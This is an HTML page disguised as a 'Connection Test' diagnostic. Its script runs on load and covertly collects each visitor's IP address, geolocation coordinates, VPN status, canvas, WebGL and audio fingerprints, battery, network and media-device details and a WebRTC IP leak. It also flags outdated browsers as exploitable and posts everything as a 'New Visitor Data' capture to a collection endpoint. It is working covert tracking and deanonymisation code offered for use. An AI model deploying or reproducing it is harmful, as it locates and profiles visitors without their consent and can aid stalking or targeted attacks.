<!DOCTYPE html>
<html>
<head>
    <title>Connection Test</title>
    <style>body{background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:2rem;}</style>
</head>
<body>
    <h1>Establishing secure link...</h1>
    <pre id="log">Collecting diagnostic data...</pre>
    <script>
        const BACKEND_URL = '/api/collect';

        (async () => {
            const data = {};

            // ---- IP + VPN detection ----
            async function getIPInfo() {
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const { ip } = await ipRes.json();
                    data.public_ip = ip;
                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    const geo = await geoRes.json();
                    data.ip_details = geo;
                    data.vpn_detected = geo.proxy || geo.hosting || (geo.org && geo.org.toLowerCase().includes('vpn')) || false;
                    data.approximate_location = { city: geo.city, region: geo.region, country: geo.country_name, lat: geo.latitude, lon: geo.longitude };
                } catch(e) { data.ip_error = e.message; }
            }

            // ---- Advanced Fingerprint ----
            function getFingerprint() {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints,
                    screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    canvas: null,
                    webgl: null,
                    audio: null
                };

                // Canvas fingerprint
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 100, 30);
                ctx.fillStyle = '#069';
                ctx.fillText('Frenesis', 2, 15);
                fp.canvas = canvas.toDataURL();

                // WebGL fingerprint
                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) {
                        fp.webgl = {
                            vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }

                // Audio fingerprint (oscillator)
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (AudioContext) {
                    const audioCtx = new AudioContext();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.frequency.value = 440;
                    oscillator.type = 'sine';
                    const bufferLength = analyser.frequencyBinCount;
                    const dataArray = new Uint8Array(bufferLength);
                    oscillator.start(0);
                    setTimeout(() => {
                        analyser.getByteFrequencyData(dataArray);
                        fp.audio = Array.from(dataArray).slice(0, 10);
                        oscillator.stop();
                        audioCtx.close();
                    }, 100);
                }
                return fp;
            }

            // ---- Vulnerability scan (heuristics) ----
            async function scanVulns() {
                const vulns = [];
                const ua = navigator.userAgent;
                if (/Chrome\/([0-9]+)/.test(ua)) {
                    const v = parseInt(ua.match(/Chrome\/([0-9]+)/)[1]);
                    if (v < 90) vulns.push('Chrome <90 (multiple RCE CVEs)');
                } else if (/Firefox\/([0-9]+)/.test(ua)) {
                    const v = parseInt(ua.match(/Firefox\/([0-9]+)/)[1]);
                    if (v < 88) vulns.push('Firefox <88 (CVE-2021-23968)');
                }
                // WebRTC local IP leak
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ipMatch && !ipMatch[0].startsWith('192.168.') && !ipMatch[0].startsWith('10.'))
                            vulns.push(`WebRTC leak: ${ipMatch[0]}`);
                    }
                };
                if (localStorage.length > 0) vulns.push('LocalStorage has data (possible sensitive info)');
                return vulns;
            }

            // ---- Extended data (battery, network, etc.) ----
            async function getExtended() {
                const ext = {};
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    ext.battery = { level: bat.level, charging: bat.charging };
                }
                if (navigator.connection) {
                    ext.network = {
                        effectiveType: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        downlink: navigator.connection.downlink,
                        saveData: navigator.connection.saveData
                    };
                }
                // Media devices (requires permission, but we try silently)
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    ext.mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label || 'hidden' }));
                } catch (e) { /* ignore */ }
                return ext;
            }

            // ---- Send data to our backend ----
            async function sendToBackend(payload) {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return response.ok;
            }

            // ---- Main execution ----
            await getIPInfo();
            const fingerprint = getFingerprint();
            const vulns = await scanVulns();
            const extended = await getExtended();

            const finalPayload = {
                content: '**New Visitor Data**',
                embeds: [{
                    title: 'Full Capture',
                    color: 0xff0000,
                    fields: [
                        { name: 'IP', value: data.public_ip || 'unknown', inline: true },
                        { name: 'VPN/Proxy', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
                        { name: 'Location', value: data.approximate_location ? `${data.approximate_location.city}, ${data.approximate_location.country} (${data.approximate_location.lat},${data.approximate_location.lon})` : 'unknown', inline: false },
                        { name: 'Fingerprint (JSON)', value: '```json\n' + JSON.stringify(fingerprint, null, 2).substring(0, 800) + '```', inline: false },
                        { name: 'Vulnerabilities', value: vulns.length ? vulns.join('\n') : 'None detected', inline: false },
                        { name: 'Extended Info', value: '```json\n' + JSON.stringify(extended, null, 2).substring(0, 800) + '```', inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };
            await sendToBackend(finalPayload);
            document.getElementById('log').innerText = 'Diagnostic complete. Data sent.';
        })().catch(e => {
            document.getElementById('log').innerText = 'Error: ' + e.message;
            console.error(e);
        });
    </script>
</body>
</html>
